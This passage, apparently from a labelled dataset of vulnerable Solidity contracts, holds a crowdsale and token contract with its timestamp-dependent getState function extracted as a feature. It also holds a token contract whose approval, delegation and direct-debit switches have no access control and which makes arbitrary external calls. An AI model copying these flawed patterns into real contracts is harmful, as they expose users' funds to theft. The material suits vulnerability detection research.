JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ebd"
  },
  "filename": "10295.sol",
  "content": "pragma solidity ^0.4.24;\npragma experimental \"v0.5.0\";\npragma experimental ABIEncoderV2;\nlibrary AddressExtension {\n function isValid(address _address) internal pure returns (bool) {\n return 0 != _address;\n }\n function isAccount(address _address) internal view returns (bool result) {\n assembly {\n result := iszero(extcodesize(_address))\n }\n }\n function toBytes(address _address) internal pure returns (bytes b) {\n assembly {\n let m := mload(0x40)\n mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address))\n mstore(0x40, add(m, 52))\n b := m\n }\n }\n}\nlibrary Math {\n struct Fraction {\n uint256 numerator;\n uint256 denominator;\n }\n function isPositive(Fraction memory fraction) internal pure returns (bool) {\n return fraction.numerator > 0 && fraction.denominator > 0;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a * b;\n require((a == 0) || (r / a == b));\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256 r) {\n r = a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a - b) <= a);\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 r) {\n require((r = a + b) >= a);\n }\n function min(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) internal pure returns (uint256 r) {\n return x >= y ? x : y;\n }\n function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n r /= d;\n } else {\n r = mul(value / d, m);\n }\n }\n function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) {\n r = value * m;\n if (r / value == m) {\n if (r % d == 0) {\n r /= d;\n } else {\n r = (r / d) + 1;\n }\n } else {\n r = mul(value / d, m);\n if (value % d != 0) {\n r += 1;\n }\n }\n }\n function mul(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.numerator, f.denominator);\n }\n function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.numerator, f.denominator);\n }\n function div(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDiv(x, f.denominator, f.numerator);\n }\n function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) {\n return mulDivCeil(x, f.denominator, f.numerator);\n }\n function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) {\n return Math.Fraction({\n numerator: mul(x.numerator, y.numerator),\n denominator: mul(x.denominator, y.denominator)\n });\n }\n}\ncontract FsTKAuthority {\n function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);\n function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);\n function validate() public pure returns (bytes4);\n}\ncontract Authorizable {\n event SetFsTKAuthority(FsTKAuthority indexed _address);\n modifier onlyFsTKAuthorized {\n require(fstkAuthority.isAuthorized(msg.sender, this, msg.data));\n _;\n }\n modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) {\n require(fstkAuthority.isApproved(hash, approveTime, approveToken));\n _;\n }\n FsTKAuthority internal fstkAuthority;\n constructor(FsTKAuthority _fstkAuthority) internal {\n fstkAuthority = _fstkAuthority;\n }\n function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized {\n require(_fstkAuthority.validate() == _fstkAuthority.validate.selector);\n emit SetFsTKAuthority(fstkAuthority = _fstkAuthority);\n }\n}\ncontract ERC20 {\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address owner) public view returns (uint256);\n function allowance(address owner, address spender) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n}\ncontract SecureERC20 is ERC20 {\n event SetERC20ApproveChecking(bool approveChecking);\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool);\n function increaseAllowance(address spender, uint256 value) public returns (bool);\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool);\n function setERC20ApproveChecking(bool approveChecking) public;\n}\ncontract FsTKToken {\n event Consume(address indexed from, uint256 value, bytes32 challenge);\n event IncreaseNonce(address indexed from, uint256 nonce);\n event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info);\n event TerminateDirectDebit(address indexed debtor, address indexed receiver);\n event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver);\n event SetMetadata(string metadata);\n event SetLiquid(bool liquidity);\n event SetDelegate(bool isDelegateEnable);\n event SetDirectDebit(bool isDirectDebitEnable);\n struct DirectDebitInfo {\n uint256 amount;\n uint256 startTime;\n uint256 interval;\n }\n struct DirectDebit {\n DirectDebitInfo info;\n uint256 epoch;\n }\n struct Instrument {\n uint256 allowance;\n DirectDebit directDebit;\n }\n struct Account {\n uint256 balance;\n uint256 nonce;\n mapping (address => Instrument) instruments;\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256);\n function transfer(uint256[] data) public returns (bool);\n function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool);\n function nonceOf(address owner) public view returns (uint256);\n function increaseNonce() public returns (bool);\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) public returns (bool);\n function directDebit(address debtor, address receiver) public view returns (DirectDebit);\n function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);\n function terminateDirectDebit(address receiver) public returns (bool);\n function withdrawDirectDebit(address debtor) public returns (bool);\n function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);\n}\ncontract ERC20Like is SecureERC20, FsTKToken {\n using AddressExtension for address;\n using Math for uint256;\n modifier liquid {\n require(isLiquid);\n _;\n }\n modifier canUseDirectDebit {\n require(isDirectDebitEnable);\n _;\n }\n modifier canDelegate {\n require(isDelegateEnable);\n _;\n }\n modifier notThis(address _address) {\n require(_address != address(this));\n _;\n }\n bool public erc20ApproveChecking;\n bool public isLiquid = true;\n bool public isDelegateEnable;\n bool public isDirectDebitEnable;\n string public metadata;\n mapping(address => Account) internal accounts;\n constructor(string _metadata) public {\n metadata = _metadata;\n }\n function balanceOf(address owner) public view returns (uint256) {\n return accounts[owner].balance;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return accounts[owner].instruments[spender].allowance;\n }\n function transfer(address to, uint256 value) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n senderAccount.balance = senderAccount.balance.sub(value);\n accounts[to].balance += value;\n emit Transfer(msg.sender, to, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {\n Account storage fromAccount = accounts[from];\n Instrument storage senderInstrument = fromAccount.instruments[msg.sender];\n fromAccount.balance = fromAccount.balance.sub(value);\n senderInstrument.allowance = senderInstrument.allowance.sub(value);\n accounts[to].balance += value;\n emit Transfer(from, to, value);\n return true;\n }\n function approve(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n if (erc20ApproveChecking) {\n require((value == 0) || (spenderInstrument.allowance == 0));\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = value\n );\n return true;\n }\n function setERC20ApproveChecking(bool approveChecking) public {\n emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);\n }\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n require(spenderInstrument.allowance == expectedValue);\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function increaseAllowance(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = spenderInstrument.allowance.add(value)\n );\n return true;\n }\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n uint256 currentValue = spenderInstrument.allowance;\n uint256 newValue;\n if (strict) {\n newValue = currentValue.sub(value);\n } else if (value < currentValue) {\n newValue = currentValue - value;\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function setMetadata0(string _metadata) internal {\n emit SetMetadata(metadata = _metadata);\n }\n function setLiquid0(bool liquidity) internal {\n emit SetLiquid(isLiquid = liquidity);\n }\n function setDelegate(bool delegate) public {\n emit SetDelegate(isDelegateEnable = delegate);\n }\n function setDirectDebit(bool directDebit) public {\n emit SetDirectDebit(isDirectDebitEnable = directDebit);\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256) {\n Account storage ownerAccount = accounts[owner];\n return Math.min(\n ownerAccount.instruments[spender].allowance,\n ownerAccount.balance\n );\n }\n function transfer(uint256[] data) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n uint256 totalValue;\n for (uint256 i = 0; i < data.length; i++) {\n address receiver = address(data[i] >> 96);\n uint256 value = data[i] & 0xffffffffffffffffffffffff;\n totalValue = totalValue.add(value);\n accounts[receiver].balance += value;\n emit Transfer(msg.sender, receiver, value);\n }\n senderAccount.balance = senderAccount.balance.sub(totalValue);\n return true;\n }\n function transferAndCall(\n address to,\n uint256 value,\n bytes data\n )\n public\n payable\n liquid\n notThis(to)\n returns (bool)\n {\n require(\n transfer(to, value) &&\n data.length >= 68\n );\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), caller)\n }\n require(to.call.value(msg.value)(data));\n return true;\n }\n function nonceOf(address owner) public view returns (uint256) {\n return accounts[owner].nonce;\n }\n function increaseNonce() public returns (bool) {\n emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);\n }\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n address to,\n uint256 value,\n bytes data,\n address delegator,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n public\n liquid\n canDelegate\n notThis(to)\n returns (bool)\n {\n address signer = ecrecover(\n keccak256(abi.encodePacked(nonce, fee, to, value, data, delegator)),\n v,\n r,\n s\n );\n Account storage signerAccount = accounts[signer];\n require(\n nonce == signerAccount.nonce &&\n (delegator == address(0) || delegator == msg.sender)\n );\n emit IncreaseNonce(signer, signerAccount.nonce += 1);\n signerAccount.balance = signerAccount.balance.sub(value.add(fee));\n accounts[to].balance += value;\n emit Transfer(signer, to, value);\n accounts[msg.sender].balance += fee;\n emit Transfer(signer, msg.sender, fee);\n if (!to.isAccount()) {\n require(data.length >= 68);\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), signer)\n }\n require(to.call(data));\n }\n return true;\n }\n function directDebit(address debtor, address receiver) public view returns (DirectDebit) {\n return accounts[debtor].instruments[receiver].directDebit;\n }\n function setupDirectDebit(\n address receiver,\n DirectDebitInfo info\n )\n public\n returns (bool)\n {\n accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({\n info: info,\n epoch: 0\n });\n emit SetupDirectDebit(msg.sender, receiver, info);\n return true;\n }\n function terminateDirectDebit(address receiver) public returns (bool) {\n delete accounts[msg.sender].instruments[receiver].directDebit;\n emit TerminateDirectDebit(msg.sender, receiver);\n return true;\n }\n function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n debtorAccount.balance = debtorAccount.balance.sub(amount);\n accounts[msg.sender].balance += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n return true;\n }\n function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\n Account storage receiverAccount = accounts[msg.sender];\n result = true;\n uint256 total;\n for (uint256 i = 0; i < debtors.length; i++) {\n address debtor = debtors[i];\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n uint256 debtorBalance = debtorAccount.balance;\n if (amount > debtorBalance) {\n if (strict) {\n revert();\n }\n result = false;\n emit WithdrawDirectDebitFailure(debtor, msg.sender);\n } else {\n debtorAccount.balance = debtorBalance - amount;\n total += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n }\n }\n receiverAccount.balance += total;\n }\n}\ncontract ServiceVoucher is Authorizable, ERC20Like {\n uint256 public totalSupply;\n string public name;\n string public symbol;\n uint8 public constant decimals = 0;\n bool public constant isConsumable = true;\n constructor(\n FsTKAuthority _fstkAuthority,\n string _name,\n string _symbol,\n string _metadata\n )\n Authorizable(_fstkAuthority)\n ERC20Like(_metadata)\n public\n {\n name = _name;\n symbol = _symbol;\n }\n function mint(address to, uint256 value) public onlyFsTKAuthorized returns (bool) {\n totalSupply = totalSupply.add(value);\n accounts[to].balance += value;\n emit Transfer(address(0), to, value);\n return true;\n }\n function consume(address from, uint256 value) public onlyFsTKAuthorized returns (bool) {\n Account storage fromAccount = accounts[from];\n fromAccount.balance = fromAccount.balance.sub(value);\n totalSupply -= value;\n emit Consume(from, value, bytes32(0));\n emit Transfer(from, 